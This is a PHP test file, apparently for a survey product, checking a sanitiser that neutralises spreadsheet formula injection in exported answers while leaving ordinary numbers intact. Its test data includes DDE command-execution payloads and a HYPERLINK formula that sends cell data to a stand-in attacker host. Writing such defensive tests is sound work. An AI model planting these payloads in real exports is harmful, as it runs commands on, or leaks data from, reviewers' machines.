<?php

declare(strict_types=1);

use App\Support\Export\SpreadsheetCell;

/*
|--------------------------------------------------------------------------
| Spreadsheet formula injection (Increment I8c) — the one row docs/security-threat-model.md still marked
| **Open**, and the rare vulnerability whose payload travels through a system behaving perfectly.
|--------------------------------------------------------------------------
| A respondent types `=cmd|' /C calc'!A0` into a text answer. Nothing happens in the product: it is a
| string, stored as a string, rendered as a string. Then a reviewer exports and opens the file, and Excel
| executes it ON THE REVIEWER'S MACHINE, with the reviewer's privileges, outside anything this application
| can defend.
|
| ⚠️ THE NUMERIC GUARD IS THE HALF THAT IS EASY TO GET WRONG, and its failure mode is a DATA-INTEGRITY
| regression shipped in the name of security: `-5` and `+40` both start with a dangerous character and are
| both ordinary numbers. Prefixing them would turn every negative figure in every export into literal text,
| breaking sums, charts and every downstream analysis a reviewer runs.
*/

it('prefixes every OWASP formula opener', function (string $payload): void {
    expect(SpreadsheetCell::safe($payload))->toBe("'".$payload);
})->with([
    'equals' => '=cmd|\' /C calc\'!A0',
    'plus' => '+cmd|\' /C calc\'!A0',
    'minus' => '-2+3+cmd|\' /C calc\'!A0',
    'at' => '@SUM(1+9)*cmd|\' /C calc\'!A0',
    'tab' => "\t=1+1",
    'carriage return' => "\r=1+1",
    'hyperlink exfiltration' => '=HYPERLINK("http://evil.example/?d="&A1,"Click")',
    'DDE' => '=2+5+cmd|\' /C notepad\'!\'A1\'',
]);

it('leaves an ordinary answer completely untouched', function (string $value): void {
    expect(SpreadsheetCell::safe($value))->toBe($value);
})->with([
    'a name' => 'Ada Lovelace',
    'a sentence with an equals inside' => 'width = 30cm',
    'an email' => 'ada@example.test',
    'empty' => '',
    'a date' => '2026-08-08',
]);

it('never prefixes a well-formed number, however dangerous its first character', function (string $value): void {
    // The data-integrity half. A real number cannot carry a formula, so it passes through — otherwise
    // every negative figure in an export becomes the literal text `'-5` and stops summing.
    expect(SpreadsheetCell::safe($value))->toBe($value);
})->with([
    'negative int' => '-5',
    'negative decimal' => '-0.75',
    'explicit positive' => '+40',
    'scientific' => '-1.2e6',
]);

it('passes non-strings through by TYPE, not by coercion', function (mixed $value): void {
    // An int, float, bool or null cannot open a formula, and stringifying them here would change how
    // openspout types the resulting cell — a number column would silently become a text column.
    expect(SpreadsheetCell::safe($value))->toBe($value);
})->with([
    'int' => -5,
    'float' => -0.75,
    'true' => true,
    'null' => null,
]);

it('sanitises a whole row while preserving arity and keys', function (): void {
    $row = ['Ada', '=1+1', -5, null, '@evil'];

    expect(SpreadsheetCell::row($row))->toBe(['Ada', "'=1+1", -5, null, "'@evil"]);
});

it('is idempotent in effect — a prefixed value is no longer dangerous', function (): void {
    // Not a claim that double-application is harmless (it is not: `''=1+1` would show one apostrophe),
    // but that the OUTPUT of safe() is not itself a formula opener. That is what makes it correct to
    // apply exactly once, at the writer boundary, and nowhere else.
    $once = SpreadsheetCell::safe('=1+1');

    expect($once[0])->toBe("'");
    expect(SpreadsheetCell::safe($once))->toBe($once);
});
